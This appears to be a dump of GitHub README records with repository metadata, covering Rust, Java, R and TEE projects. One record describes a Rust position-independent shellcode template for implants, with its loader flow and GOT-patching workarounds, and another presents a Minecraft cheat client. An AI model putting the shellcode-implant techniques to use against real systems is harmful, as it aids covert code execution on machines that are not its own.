5. Reduce generation verification overhead

## Contributing

This is an experiment that I would like to improve further over time.

I welcome contributions that would:
- Explore new async allocation patterns
- Improve performance characteristics

## License

[![License: MPL 2.0](https://img.shields.io/badge/License-MPL%202.0-brightgreen.svg)](LICENSE)

## Why This Exists

This allocator serves as an investigation into several questions:
- Can we build a fully async-first allocator?
- What are the real costs of lock-free memory management?
- How do we handle task isolation efficiently?
- What patterns emerge in async memory usage?

While the current implementation is not performance-competitive, I think it offers some insights on where to go next.

## Final Disclaimer

This was built as an exploration of the boundaries of async Rust. Don't use this in production unless you enjoy debugging memory allocation patterns more than having a functional application.

---
*Last updated: October 26, 2024*
",0,0,1,MPL-2.0,rust.yml,0.0
pivovarit/more-gatherers,main,"# more-gatherers

Missing Stream API functionality you always longed for - provided via `Gatherers`

[![build](https://github.com/pivovarit/more-gatherers/actions/workflows/build.yml/badge.svg?branch=main)](https://github.com/pivovarit/more-gatherers/actions/workflows/build.yml)
[![pitest](https://github.com/pivovarit/more-gatherers/actions/workflows/pitest.yml/badge.svg?branch=main)](https://pivovarit.github.io/more-gatherers)
![Maven Central Version](https://img.shields.io/maven-central/v/com.pivovarit/more-gatherers)

[![Stargazers over time](https://starchart.cc/pivovarit/more-gatherers.svg?variant=adaptive)](https://starchart.cc/pivovarit/more-gatherers)

## Project is under intense development and will be released alongside Java 24, when Stream Gatherers go GA (hopefully)

### Overview

Java's Stream API is a powerful tool for processing collections of data. However, it lacks some functionality that could make it even more powerful. This library aims to fill that gap by providing a set of `Gatherers` that can be used to collect data from a stream more flexibly.

Whenever possible, the library follows Project Reactor's naming conventions.

Provided `Gatherers`:
- `MoreGatherers.last(int)`
  - takes last `n` elements from the stream
- `MoreGatherers.sampling(int)`
  - takes every `n`-th element from the stream
- `MoreGatherers.zip(Iterator<T2>)`
  - zips `Stream` elements with elements from the provided `Iterator`
- `MoreGatherers.zip(Iterator<T2>, BiFunction<T1,T2>)`
  - zips `Stream` elements with elements from the provided `Iterator` using a custom zipper function
- `MoreGatherers.zip(Stream<T2>)`
  - zips `Stream` elements with elements from the provided `Stream`
- `MoreGatherers.zip(Stream<T2>, BiFunction<T1,T2>)`
  - zips `Stream` elements with elements from the provided `Stream` using a custom zipper function
- `MoreGatherers.zipWithIterable(Iterable<T2>)`
  - zips `Stream` elements with elements from the provided `Iterable`
- `MoreGatherers.zipWithIterable(Iterable<T2>, BiFunction<T1,T2>)`
  - zips elements with elements from the provided `Iterable` using a custom zipper function
- `MoreGatherers.zipWithIndex()`
  - zips `Stream` elements with their index
- `MoreGatherers.zipWithIndex(BiFunction<Long,T>)`
  - zips `Stream` elements with their index using a custom zipper function
- `MoreGatherers.distinctBy(Function<T, R>)`
  - takes distinct elements based on a key extractor function
- `MoreGatherers.distinctByKeepLast(Function<T, R>)`
  - takes distinct elements based on a key extractor function, keeping the last occurrence
- `MoreGatherers.distinctUntilChanged()`
  - takes elements until a change is detected
- `MoreGatherers.distinctUntilChanged(Function<T, R>)`
  - takes elements until a change is detected based on a key extractor function
- `MoreGatherers.windowSliding(int, int)`
  - creates a sliding window of a fixed size with a fixed step, extends `Gatherers.windowSliding(int)` by adding a step parameter
- `MoreGatherers.byIndex(BiPredicate<Long, T>)`
  - filters elements based on their index and value

### Philosophy

The primary goal of this library is to complement the existing Stream API by providing functionality that's currently missing without duplicating features already available. While it is technically possible to create numerous custom Gatherers, this library focuses on offering only those that cannot be easily achieved using standard Stream API operations.

The library is designed to be as lightweight as possible, with no external dependencies. It's implemented using core Java libraries and follows the same conventions as the standard Stream API, drawing inspiration from Project Reactor's method names.
",0,0,3,Apache-2.0,"build.yml,pitest.yml,release-drafter.yml,release.yml",62.0
xqb64/ucc,master,"# ucc

This is a Rust implementation of the C compiler from Nora Sandler's book.

## How it works

At the forefront is the compiler driver, which orchestrates the compilation process---from lexing and parsing, through several stages of semantic analysis, such as variable resolution, loop labeling, and type checking. After generating an intermediate representation (IR), the compiler passes it through an iterative optimization pipeline. This pipeline leverages forward and backward data-flow analysis, liveness analysis, and address-taken analysis to implement optimizations such as constant folding, unreachable code elimination, copy propagation, and dead store elimination. Finally, it generates and optimizes the x86_64 assembly code using a graph coloring-based register allocator with conservative coalescing, before emitting the optimized code.

## Status

- [x] char (in both unsigned and signed variants)
- [ ] short
- [x] int (in both unsigned and signed variants)
- [x] long (in both unsigned and signed variants)
- [ ] float
- [x] double
- [x] void
- [x] if/else
- [ ] switch
- [x] while
- [x] do while
- [x] for
- [x] break
- [x] continue
- [ ] ConsideredHarmful
- [x] static
- [x] extern
- [x] arrays
- [x] structs
- [x] sizeof
- [ ] enums
- [ ] unions
- [ ] typedef

## License

Licensed under the MIT license.",0,0,1,MIT,,0.0
Irate-Walrus/stardust-rs,main,"# Rust Position Independent Shellcode (PIC) Template for i686 & x86\_64 Linux & x86_64 Windows

> [!warning]
> This is/was an experiment and I can personally garantee it is unsafe. I describe below some of the unobvious (to me) issues I ended up facing.
> I'm keen to hear of any possible workarounds for these issues, just open a PR.

This code is based on the following previous work:
- https://bruteratel.com/research/feature-update/2021/01/30/OBJEXEC/
- https://5pider.net/blog/2024/01/27/modern-shellcode-implant-design/
- https://github.com/wumb0/rust_bof
- https://kerkour.com/rust-position-independent-shellcode
- https://github.com/safedv/Rustic64

The following targets are supported:
- `i686-unknown-linux-gnu`
- `x86_x64-unknown-linux-gnu`
- `x86_64-pc-windows-gnu`

Following is the current output of `cargo make --env TARGET=""x86_64-unknown-linux-gnu run`:

```
***     [LOADER]        ***
[*] Allocate RW Memory
[*] Copy Shellcode Into RW Memory
[*] Set Memory RX
[*] Allocation Start Address:   0x700000000000
[*] Allocation End Address:     0x700000003107
[*] Allocation Size:            12551B

***     [STARDUST x86_64]       ***
[*] Hello Stardust!
[*] Stardust Start Address:     0x700000000000
[*] Stardust Length:            12551
[*] Stardust Instance:          0x7f66cc115000
[*] Hitting Breakpoint!
```

## Problem #1 - `format!` macro e.g. `&'static &str`

Using the `alloc::fmt::format!` macro will result in a segementation fault due to absolute addresses to reference the `pieces` in `Arguments { pieces, fmt: None, args }`.


This results in the `if !piece.is_empty()` check failing within the following code
@ [https://github.com/rust-lang/rust/blob/master/library/core/src/fmt/mod.rs](https://github.com/rust-lang/rust/blob/150247c338a54cb3d08614d8530d1bb491fa90db/library/core/src/fmt/mod.rs#L1172C1-L1190C10):

```rust
/* core::fmt::write () at core/src/fmt/mod.rs:1179 */
/* 1172 */ match args.fmt {
/* 1173 */     None => {
/* 1174 */         // We can use default formatting parameters for all arguments.
/* 1175 */         for (i, arg) in args.args.iter().enumerate() {
/* 1176 */             // SAFETY: args.args and args.pieces come from the same Arguments,
/* 1177 */             // which guarantees the indexes are always within bounds.
/* 1178 */             let piece = unsafe { args.pieces.get_unchecked(i) };
/* 1179 */             if !piece.is_empty() { // This is the check currently failing
/* 1180 */                 formatter.buf.write_str(*piece)?;
/* 1181 */             }
/* 1182 */
/* 1183 */             // SAFETY: There are no formatting parameters and hence no
/* 1184 */             // count arguments.
/* 1185 */             unsafe {
/* 1186 */                 arg.fmt(&mut formatter)?;
/* 1187 */             }
/* 1188 */             idx += 1;
/* 1189 */         }
/* 1190 */     }
```

This leads to a call being made to `_gcc_except_table` which has been removed by [linux.ld](./stardust/scripts/linux.ld) resulting in a segmentation fault.

> [!note]
> Patching the GOT appeared to get us a little further along before it crashes. YAY!ü•≥

**Solution**: None

## (Solved) Problem #2 - Global Offset Table (GOT)

A bunch of stuff uses the GOT including calls to functions with the `compiler_builtins` crate, e.g. the following functions:
- `memcpy`
- `memmove`
- `memset`
- `memcmp`
- `bcmp`

This resulted in a segmentation fault due to a `call` made to a bad/absolute hard-coded memory address stored within the GOT and then referenced by a RIP-relative offset.

Similarly using `extern ""C""` functions directly may result in the use the GOT.


The following code was used to ensure `memcpy` was required by the binary:

```rust
let src = alloc::string::String::from(""SSECCUS\t\t:ypcmem gnitseT"");
let dst: String = src.chars().rev().collect();
info!(&dst);
```

Patching the hardcoded addresses with GDB results in a successful execution as seen below:

![Patching `memcpy` address in GOT with GDB](./docs/patching-memcpy-addr.png)

**Solution**:
- Patch the GOT dynamically during runtime, this appears to allow the use of `compiler_builtins`!
- Don't directly call `extern` functions before patching, call them within `asm!` macro
",0,0,1,,,0.0
yutannihilation/vellogd-r,main,"vellogd: A GPU-powered Interactive Graphics Device for R
========================================================

[![R-CMD-check.yaml](https://github.com/yutannihilation/vellogd-r/actions/workflows/R-CMD-check.yaml/badge.svg)](https://github.com/yutannihilation/vellogd-r/actions/workflows/R-CMD-check.yaml)
[![vellogd status badge](https://yutannihilation.r-universe.dev/badges/vellogd)](https://yutannihilation.r-universe.dev/vellogd)

Vellogd is an experimental graphics device for R. This is powered by [vello], a
cross-platform 2D rendering engine with GPU.

[vello]: https://github.com/linebender/vello

# Why yet another graphics device?

You might wonder why we need vellogd while there are already high-quality,
cross-platform graphics devices like [ragg] and [svglite]. Behind vellogd, I
have mainly two motivations.

[ragg]: https://ragg.r-lib.org/
[svglite]: https://svglite.r-lib.org/

## ""Interactive"" graphics device with extra features

As far as I know, there's no cross-platform and **interactive** graphics device.
R provides interactive graphics devices, but they are not really cross-platform.
They are implemented differently, which makes some features missing on some
platform (e.g. [X11 on Windows doesn't provide `onIdle` event][coolbutuseless]).

[coolbutuseless]: https://coolbutuseless.github.io/2022/05/06/introducing-eventloop-realtime-interactive-rendering-in-r/

What's more exciting about crafting a new graphics device is, we might be able
to implement extra features beyond R's graphics API. What do you want an
interactive graphics device to be? Here's my wishlist, for example.

* Zoom in and out by mousewheel
* Support touch device
* Provide an API for [Lottie animation](https://airbnb.io/lottie/)
* Provide an API to draw a bezier curve (why R provides no API...?)

## A showcase of the power of WebGPU

One more thing I feel a bit frustrating about R's graphics ecosystem is, it's
too CPU-centric. I'm not an expert of GPU, but I think R can utilize the power
of GPU a lot more.

I understand it's difficult to use GPU in an R package because different
platforms and different vendors require different implementation. However, now
we have [**the WebGPU standard**](https://gpuweb.github.io/gpuweb/) and the
cross-platform implemntations of the API in C++ ([dawn], used by Chrome) and
Rust ([wgpu], used by Firefox and Deno).

[dawn]: https://dawn.googlesource.com/dawn/+/refs/heads/chromium-gpu-experimental/README.md
[wgpu]: https://wgpu.rs/

Unlike the name indicates, WebGPU is not only for web. It's a GPU-powered
graphics API, which is so **portable and safe** that it can be used on web
browsers. So, if you want to create a cross-platform R package using GPU, WebGPU
can be the best choice. I hope vellogd servers as a showcase of such an attempt.

(Personally, I'm hoping rayshader will use WebGPU!)

# Installation

> [!CAUTION]
> vellogd is at the verrry early stage of the development. This might crash not only your R sesson, but also your GPU. Please try at your own risk!

The vellogd package can be installed via R-universe.

```r
install.packages(""vellogd"", repos = c(""https://yutannihilation.r-universe.dev"", ""https://cloud.r-project.org""))
```

## Usages

Vellogd provides two functions to open the graphics device. You can use
`vellogd()` if you are on Windows or on Linux, otherwise (i.e. on macOS) use
`vellogd_with_server()`.

## `vellogd()` (Windows, Linux)

If you are on macOS, this isn't available to you! If you are curious about the reason, my write-up might help: [How To Use Winit With R (Or How To Run Winit On A Non-Main Thread)](https://yutani.rbind.io/post/winit-and-r/).

If you are on Windows or on Linux, this method should preferable. As this runs a window on the same process as the R session, less data copy is needed.

```r
# Open a device
vellogd()

library(ggplot2)

ggplot(mpg, aes(displ, hwy, colour = class)) + 
  geom_point() +
  theme(text = element_text(size = 25))

dev.off()
```

## `vellogd_with_server()` (macOS, Windows, Linux)

This is available to all macOS, Windows and Linux.
This launches a server as a separate process, so drawing heavy data (e.g. raster) might take longer time.

```r
# Open a device
vellogd_with_server()

library(ggplot2)

ggplot(mpg, aes(displ, hwy, colour = class)) + 
  geom_point() +
  theme(text = element_text(size = 25))

dev.off()
```

# Supported R Graphics Device API

cf. <https://github.com/r-devel/r-svn/blob/main/src/include/R_ext/GraphicsDevice.h>


| API               | supported? | Note |
|:------------------|:---|:-----------|
| `activate`        | ‚úÖ |  |
| `deactivate`      | ‚úÖ |  |
| `close`           | ‚úÖ |  |
| `newPage`         | ‚úÖ |  |
| `size`            | ‚úÖ |  |
| `mode`            | ‚úÖ | TODO: server version |
| `newFrameConfirm` | ‚úÖ | Do nothing |
| `holdflush`       |    | |
| `locator`         |    | |
| `onExit`          |    | |
| `line`            | ‚úÖ | Draw [`kurbo::Line`] |
| `circle`          | ‚úÖ | Draw [`kurbo::Circle`] |
| `rect`            | ‚úÖ | Draw [`kurbo::Rect`] |
| `polygon`         | ‚úÖ | Draw [`kurbo::BezPath`]. |
| `path`            | ‚úÖ | Draw [`kurbo::BezPath`]. |
| `polyline`        | ‚úÖ | Draw [`kurbo::BezPath`]. |
| `raster`          | ‚úÖ | TODO: server version, non-interpolated version |
| `metricInfo`      | ‚úÖ | |
| `strWidth`        | ‚úÖ | |
| `text`            | ‚úÖ | |
| `textUTF8`        | ‚úÖ | |
| `glyph`           | ‚úÖ | TODO: server version |
| `clip`            | ‚úÖ | TODO: server version, can I hide the clipping rectangle? |
| `cap`             |    | |
| `eventHelper`     |    | |
| `setPattern`      | ‚úÖ  | TODO: tiling, fix #24 |
| `releasePattern`  | ‚úÖ  | TODO: tiling, fix #24 |
| `setClipPath`     |    | |
| `releaseClipPath` |    | |
| `setMask`         |    | |
| `releaseMask`     |    | |
| `defineGroup`     |    | |
| `useGroup`        |    | |
| `releaseGroup`    |    | |
| `stroke`          |    | |
| `fill`            |    | |
| `fillStroke`      |    | |
| `capabilities`    | ‚úÖ | |

[`kurbo::Line`]: https://docs.rs/kurbo/latest/kurbo/struct.Line.html
[`kurbo::Circle`]: https://docs.rs/kurbo/latest/kurbo/struct.Circle.html
[`kurbo::Rect`]: https://docs.rs/kurbo/latest/kurbo/struct.Rect.html
[`kurbo::BezPath`]: https://docs.rs/kurbo/latest/kurbo/struct.BezPath.html

# Special note

The code related to R Graphics Device API is based on [extendr's code][extendr].
While most part of it is done by me when I was a member of extendr org, vello
would not exist if there were no extendr.

[extendr]: https://github.com/extendr/extendr/tree/master/extendr-api/src/graphics
",4,5,1,NOASSERTION,"R-CMD-check.yaml,build-server.yaml",13.0
conradludgate/tokio-supervisor,main,"# tokio-supervisor

Work in progress

## What is this?

This is a library that hooks into your tokio runtime (using unstable features) to monitor your runtime
threads for suspicious tasks that are blocking the thread. It currently only works on Linux and MacOS.

In the future, it will also attempt to spawn some new worker threads to pick up the slack to try
and improve efficiency and unblock your application in the rare event that all your tasks end up blocking.

## How does it work?

Using `RuntimeMetrics::worker_poll_count`, we can detect when a worker is no longer making progress. If the poll
count does not increase after some duration, it is flagged as blocking (it could also be parked, which we also test for). If the thread
is detected as blocking, we send a signal to that thread.

Additionally, we set up a global channel and signal handler on all threads to respond to this signal.
It handles the signal by capturing a backtrace and sending it over the channel. By capturing the backtrace,
it makes it much easier to debug what is causing the runtime worker to become blocked.

## How will it handle spawning new workers?

Tokio has a mechanism built in to spawn a new temporary worker thread called `block_in_place`. Unfortunately
it will reclaim the worker state once the block_in_place method completes. We would need to move this logic
so that tokio only reclaims the worker state once the task unblocks itself.

## Example

```rust
#[tokio::main(flavor = ""multi_thread"", worker_threads = 2)]
async fn main() {
    // Create a new supervisor and attach it to the current runtime.
    // Spawn the supervisor thread to sample all workers every 100ms.
    Supervisor::new(&tokio::runtime::Handle::current()).spawn(Duration::from_millis(100));

    // Run some workload in the runtime.
    let svc = axum::Router::new()
        .route(""/fast"", get(|| async {}))
        // will block the runtime when this API is hit.
        .route(
            ""/slow"",
            get(|| async { std::thread::sleep(Duration::from_secs(5)) }),
        )
        .with_state(())
        .into_make_service();
    axum::serve(TcpListener::bind(""0.0.0.0:8123"").await.unwrap(), svc)
        .await
        .unwrap()
}
```

Calling `http://localhost:8123/fast` shows nothing. Calling `http://localhost:8123/slow` prints

```
worker thread 1 is blocked (673097 == 673097)
backtrace::backtrace::libunwind::trace::h99d4c3ef5d4daf63
 -> ""/Users/conrad/.cargo/registry/src/index.crates.io-6f17d22bba15001f/backtrace-0.3.73/src/backtrace/libunwind.rs""
backtrace::backtrace::trace_unsynchronized::h9b3887e61be83d18
 -> ""/Users/conrad/.cargo/registry/src/index.crates.io-6f17d22bba15001f/backtrace-0.3.73/src/backtrace/mod.rs""
tokio_supervisor::tests::get_backtrace2::hedb14cb7a09bf091
 -> ""/Users/conrad/Documents/code/tokio-supervisor/src/lib.rs""
signal_hook_registry::handler::hffda5a27bfe9fd9b
 -> ""/Users/conrad/.cargo/registry/src/index.crates.io-6f17d22bba15001f/signal-hook-registry-1.4.2/src/lib.rs""
__simple_esappend
std::sys::pal::unix::thread::Thread::sleep::ha9be65893542756d
 -> ""/rustc/3f5fd8dd41153bc5fdca9427e9e05be2c767ba23/library/std/src/sys/pal/unix/thread.rs""
std::thread::sleep::h68e6720733935c56
 -> ""/rustc/3f5fd8dd41153bc5fdca9427e9e05be2c767ba23/library/std/src/thread/mod.rs""
tokio_supervisor::tests::it_works::{{closure}}::{{closure}}::{{closure}}::h7baafb1d89b51864
 -> ""/Users/conrad/Documents/code/tokio-supervisor/src/lib.rs""
<F as axum::handler::Handler<((),),S>>::call::{{closure}}::hdab8fd20326fa8e7
 -> ""/Users/conrad/.cargo/registry/src/index.crates.io-6f17d22bba15001f/axum-0.7.5/src/handler/mod.rs""
<core::pin::Pin<P> as core::future::future::Future>::poll::h236b098ffeea1b99
 -> ""/rustc/3f5fd8dd41153bc5fdca9427e9e05be2c767ba23/library/core/src/future/future.rs""
<futures_util::future::future::map::Map<Fut,F> as core::future::future::Future>::poll::hfdd9947fda4e1606
 -> ""/Users/conrad/.cargo/registry/src/index.crates.io-6f17d22bba15001f/futures-util-0.3.30/src/future/future/map.rs""
<futures_util::future::future::Map<Fut,F> as core::future::future::Future>::poll::h23cd2e63b5ba6313
 -> ""/Users/conrad/.cargo/registry/src/index.crates.io-6f17d22bba15001f/futures-util-0.3.30/src/lib.rs""
<axum::handler::future::IntoServiceFuture<F> as core::future::future::Future>::poll::hf95ed4d49ff0ba63
 -> ""/Users/conrad/.cargo/registry/src/index.crates.io-6f17d22bba15001f/axum-0.7.5/src/macros.rs""
<F as futures_core::future::TryFuture>::try_poll::h1ad9def16d43a26e
 -> ""/Users/conrad/.cargo/registry/src/index.crates.io-6f17d22bba15001f/futures-core-0.3.30/src/future.rs""
<futures_util::future::try_future::into_future::IntoFuture<Fut> as core::future::future::Future>::poll::h76645dc11ea53258
 -> ""/Users/conrad/.cargo/registry/src/index.crates.io-6f17d22bba15001f/futures-util-0.3.30/src/future/try_future/into_future.rs""
<futures_util::future::future::map::Map<Fut,F> as core::future::future::Future>::poll::hf796f107af9e2d56
 -> ""/Users/conrad/.cargo/registry/src/index.crates.io-6f17d22bba15001f/futures-util-0.3.30/src/future/future/map.rs
```

There's a lot of noise here, but if we filter down the output, we do see our `std::thread::sleep` inside an axum handler

```
worker thread 1 is blocked (673097 == 673097)
...
std::thread::sleep::h68e6720733935c56
 -> ""/rustc/3f5fd8dd41153bc5fdca9427e9e05be2c767ba23/library/std/src/thread/mod.rs""
tokio_supervisor::tests::it_works::{{closure}}::{{closure}}::{{closure}}::h7baafb1d89b51864
 -> ""/Users/conrad/Documents/code/tokio-supervisor/src/lib.rs""
<F as axum::handler::Handler<((),),S>>::call::{{closure}}::hdab8fd20326fa8e7
 -> ""/Users/conrad/.cargo/registry/src/index.crates.io-6f17d22bba15001f/axum-0.7.5/src/handler/mod.rs""
...
```
",0,0,1,,,0.0
randomguy3725/MoonLight-public,main,"# MoonLight-public

Welcome to the **MoonLight-public** repository, a fully structured client project.

## Requirements
- **Java 17** is required to build and run this project.

## Acknowledgements
This project is built upon various inspirations and contributions from the community. Special thanks to:

- **Structure Inspiration:**
  - [GradleMCPBase](https://github.com/AbyssClient/GradleMCPBase)

- **Code Contributions:**
  - Raven XD
  - Acrimony
  - Vegaline
  - Excellent
  - Expensive
  - Slack
  - Untitled
  - Faiths
  - LiquidBounce (NextGen & Legacy)
  - Watami
  - Rise
  - Tenacity
  - Pulsive 5.0
  - Cubk's EventManager
  - Xylitol
  - Nexus
  - Atani
  - Ketamine
  - Radium
  - Actinium
  - Novoline Intent
  - LiquidBounce Plus Reborn (lmfao)
  - Eject

## Disclaimer
This project may include heavily referenced or derivative works. Use it responsibly and respect intellectual property.

---

Enjoy exploring MoonLight-public! Feel free to contribute or provide feedback.
",1,0,1,,build.yml,3.0
asterinas/hyperenclave,master,"<p align=""center"">
    <a href=""https://github.com/HyperEnclave/hyperenclave"">
        <img alt=""HyperEnclave Logo"" src=""docs/images/logo.svg"" width=""75%"" />
    </a>
</p>
<p align=""center"">
    <a href=""https://github.com/HyperEnclave/hyperenclave/blob/master/LICENSE"">
        <img alt=""License"" src=""https://img.shields.io/badge/license-Apache--2.0-blue"" />
    </a>
</p>

HyperEnclave is an open and cross-platform trusted execution environment which runs on heterogeneous CPU platforms but decouples its root of trust from CPU vendors. In its nature, HyperEnclave calls for a better TEE ecosystem with improved transparency and trustworthiness. HyperEnclave has been implemented on various commodity CPU platforms and deployed in real-world confidential computing workloads.


# Key features

- **Unified abstractions.** Provide unified SGX-like abstraction with virtualization hardware.

- **Controlled RoT.** RoT(Root of Trust) has been decoupled from CPU vendors and built on the trustworthy TPM.

- **Proved security.** The first commerial Rust hypervisor that has been formally verified.

- **Auditability.** The core has been open-sourced and audited by the National Authority.


# Supported CPU List
We have successfully built HyperEnclave and performed tests on the following CPUs:
## [Intel](https://www.intel.com/)
- Intel(R) Xeon(R) Gold 6342 CPU @ 2.80GHz
- Intel 11th Gen Intel(R) Core(TM) i5-1135G7 @ 2.40GHz
## [AMD](https://www.amd.com/)
- AMD EPYC 7601 64-core Processor @2.2GHz
- AMD Ryzen R3-5300G 4-core Process @4GHz
## [Hygon](https://www.hygon.cn/)
- Hygon C86 7365 24-core Processor @2.50GHz
- Hygon C86 3350 8-core Processor @2.8GHz
## [ZHAOXIN](https://www.zhaoxin.com/)
- ZHAOXIN KH-40000 @2.0/2.2GHz
- ZHAOXIN KX-6000 @3.0GHz


# Quick start

## Prerequisites

### Software version

- Ubuntu 20.04 and Ubuntu 22.04
- Linux kernel in [Supported Linux kernel version](#supported-linux-kernel-version)
- Linux kernel headers (For building the driver)
- Docker
- GCC >= 6.5


#### Supported Linux kernel version

- Linux kernel 5.10 (**Recommend**)
- Linux kernel 5.4 with fsgsbase support


**Updates on 2024.11:** We do not support Linux kernel 4.19 with Ubuntu OS anymore.


We can check the kernel version by:
```bash
$ uname -r
```

and install the required kernel (if necessary) by:

```bash
# Download scripts for installing kernel
$ sudo apt install wget
$ wget https://raw.githubusercontent.com/pimlie/ubuntu-mainline-kernel.sh/master/ubuntu-mainline-kernel.sh
$ chmod +x ubuntu-mainline-kernel.sh
# Download and install Linux 5.10 or 5.4.0 kernel.
$ sudo ./ubuntu-mainline-kernel.sh -i [5.10.0 | 5.4.0]

# Reboot the system, and we need to select the kernel in grub menu.
$ sudo reboot
```

For Linux kernel 5.4, **enabled_rdfsbase** kernel modules must be installed by following the instructions [here](https://github.com/occlum/enable_rdfsbase).

After the Linux kernel installed, check the rdfsbase/rdgsbase is enabled:
```bash
$ cd scripts
$ ./check_prereq.sh
$ cd ..
```

And the output:
```
[Check FSGSBASE]: PASS
```

indicates that the rdfsgsbase/wrfsgsbase is enabled on your platform.

### Hardware requirements
- **CPU & Virtualization**: An Intel, AMD, or HYGON processor that supports and has enabled virtualization (VMX for Intel, AMD-V for AMD) in the BIOS.
- **IOMMU**: Intel VT-d or AMD IOMMU must be supported and enabled in the BIOS.
- **Memory**: At least 8GB of RAM.

## Steps

### Step-1: Get the full system memory size and reserve secure memory for HyperEnclave in kernel‚Äôs command-line

- **Step 1.a**: Get the full system memory size: `full_system_size`, and reserved memory size: `reserved_mem_size`

```bash
$ free -h
               total        used        free      shared  buff/cache   available
MemÔºö       15Gi       1.3Gi        11Gi       2.0Mi       3.5Gi        14Gi
SwapÔºö      2.0Gi          0B       2.0Gi
```

For the example above, the `full_system_size` is 15G, then `reserved_mem_size` eqauls to `full_system_size / 2` = 8G

- **Step 1.b**: Reserve secure memory for HyperEnclave

Open and modify the `/etc/default/grub` file, and append the following configurations for `GRUB_CMDLINE_LINUX`:

```
memmap=[reserved_mem_size]G\\\$0x100000000 iommu=off intremap=off no5lvl
```

For the example above, the configuration should be:
```
memmap=8G\\\$0x100000000 iommu=off intremap=off no5lvl
```

- **Step 1.c**: Take the new grub configuration into effect, and reboot the system

```bash
$ sudo update-grub
$ sudo reboot
```

- **Step 1.d**: Verify that the configuration takes effect

After reboot, check whether the modified kernel's command-line takes effect:

```bash
$ cat /proc/cmdline
```

You can see:
```
BOOT_IMAGE=/boot/vmlinuz-... root=... memmap=8G$0x100000000 iommu=off intremap=off no5lvl ...
```


### Step-2: Clone the repository

```bash
$ git clone https://github.com/asterinas/hyperenclave.git
$ git clone https://github.com/asterinas/hyperenclave-driver.git
```

### Step-3: Build the HyperEnclave's driver
```bash
$ cd hyperenclave-driver
$ make
$ cd ..
```

### Step-4: Build and install HyperEnclave

- **Step 4.a**: Install Rust toolchain

```bash
# Install rust toolchain 
$ curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
$ source $HOME/.cargo/env
$ rustup component add rust-src
```

- **Step 4.b**: Build and install HyperEnclave

Hyperenclave now supports three CPU vendors:
1. Intel
2. AMD
3. Hygon

We need to choose the correct CPU vendor and run the following script:

```bash
$ bash -x scripts/build_and_install_hyperenclave.sh [Intel | AMD | Hygon]
```

### Step-5: Start HyperEnclave

```bash
$ cd hyperenclave/scripts
$ bash -x start_hyperenclave.sh
$ cd ../..
```

Show the messages in kernel ring buffer by:
```bash
$ dmesg
```
And you can see:
```
...
[0] Activating hypervisor on CPU 0...
[1] Activating hypervisor on CPU 1...
[2] Activating hypervisor on CPU 2...
[3] Activating hypervisor on CPU 3...
[4] Activating hypervisor on CPU 4...
[5] Activating hypervisor on CPU 5...
[6] Activating hypervisor on CPU 6...
[7] Activating hypervisor on CPU 7...
...
```

It indicates we successfully start the HyperEnclave.

### Step-6: Run TEE applications

We provide several sample TEE applications running atop of HyperEnclave. All of them are integrated into our docker image.

Here are instructions for starting the docker container:
```bash
# Pull the docker image
$ docker pull occlum/hyperenclave:0.27.10-hypermode-1.3.0-ubuntu20.04

# Start the container
$ docker run -dt --net=host --device=/dev/hyperenclave \
                --name hyperenclave_container \
                -w /root \
                occlum/hyperenclave:0.27.10-hypermode-1.3.0-ubuntu20.04 \
                bash

# Enter the container
$ docker exec -it hyperenclave_container bash
```

#### SGX SDK Samples

You can run TEE applications developed based on [Intel SGX SDK](https://github.com/intel/linux-sgx). All the SGX SDK's sample codes are preinstalled in our docker image at `/opt/intel/sgxsdk/SampleCode`. Here are two samples (Command should be done inside Docker container):

- SampleEnclave
```bash
$ cd /opt/intel/sgxsdk/SampleCode/SampleEnclave
$ make
$ ./app
Info: executing thread synchronization, please wait...
Info: SampleEnclave successfully returned.
```

- RemoteAttestation

Reference to `demos/RemoteAttestation` for more information.

#### Occlum demos

You can also run TEE applications developed based on [Occlum](https://github.com/occlum/occlum). All the Occlum demos are preinstalled in our docker image at `/root/occlum/demos`.

We take `hello_c` as an example. (Command should be done inside Docker container):
```bash
$ cd /root/occlum/demos/hello_c

# Compile the user program with the Occlum toolchain
$ occlum-gcc -o hello_world hello_world.c
# Ensure the program works well outside enclave
$ ./hello_world
Hello World

# Initialize a directory as the Occlum instance, and prepare the Occlum's environment
$ mkdir occlum_instance && cd occlum_instance
$ occlum init
$ cp ../hello_world image/bin/
$ occlum build

# Run the user program inside an HyperEnclave's enclave via occlum run
$ occlum run /bin/hello_world
Hello World!
```


# Academic publications
[**USENIX ATC'22**] [HyperEnclave: An Open and Cross-platform Trusted Execution Environment.](https://www.usenix.org/conference/atc22/presentation/jia-yuekai)
Yuekai Jia, Shuang Liu, Wenhao Wang, Yu Chen, Zhengde Zhai, Shoumeng Yan, and Zhengyu He. 2022 USENIX Annual Technical Conference (USENIX ATC 22). Carlsbad, CA, Jul, 2022.

```
@inproceedings {jia2022hyperenclave,
  author = {Yuekai Jia and Shuang Liu and Wenhao Wang and Yu Chen and Zhengde Zhai and Shoumeng Yan and Zhengyu He},
  title = {{HyperEnclave}: An Open and Cross-platform Trusted Execution Environment},
  booktitle = {2022 USENIX Annual Technical Conference (USENIX ATC 22)},
  year = {2022},
  isbn = {978-1-939133-29-48},
  address = {Carlsbad, CA},
  pages = {437--454},
  url = {https://www.usenix.org/conference/atc22/presentation/jia-yuekai},
  publisher = {USENIX Association},
  month = jul,
}
```

[**ASPLOS'24**] [Verifying Rust Implementation of Page Tables in a Software Enclave Hypervisor.](https://dl.acm.org/doi/10.1145/3620665.3640398)
Zhenyang Dai, Shuang Liu, Vilhelm Sjoberg, Xupeng Li, Yu Chen, Wenhao Wang, Yuekai Jia, Sean Noble Anderson, Laila Elbeheiry, Shubham Sondhi, Yu Zhang, Zhaozhong Ni, Shoumeng Yan, Ronghui Gu, and Zhengyu He. 2024. Verifying Rust Implementation of Page Tables in a Software Enclave Hypervisor. In Proceedings of the 29th ACM International Conference on Architectural Support for Programming Languages and Operating Systems, Volume 2 (ASPLOS '24), Vol. 2. Association for Computing Machinery, New York, NY, USA, 1218‚Äì1232.

```
@inproceedings{10.1145/3620665.3640398,
author = {Dai, Zhenyang and Liu, Shuang and Sjoberg, Vilhelm and Li, Xupeng and Chen, Yu and Wang, Wenhao and Jia, Yuekai and Anderson, Sean Noble and Elbeheiry, Laila and Sondhi, Shubham and Zhang, Yu and Ni, Zhaozhong and Yan, Shoumeng and Gu, Ronghui and He, Zhengyu},
title = {Verifying Rust Implementation of Page Tables in a Software Enclave Hypervisor},
year = {2024},
isbn = {9798400703850},
publisher = {Association for Computing Machinery},
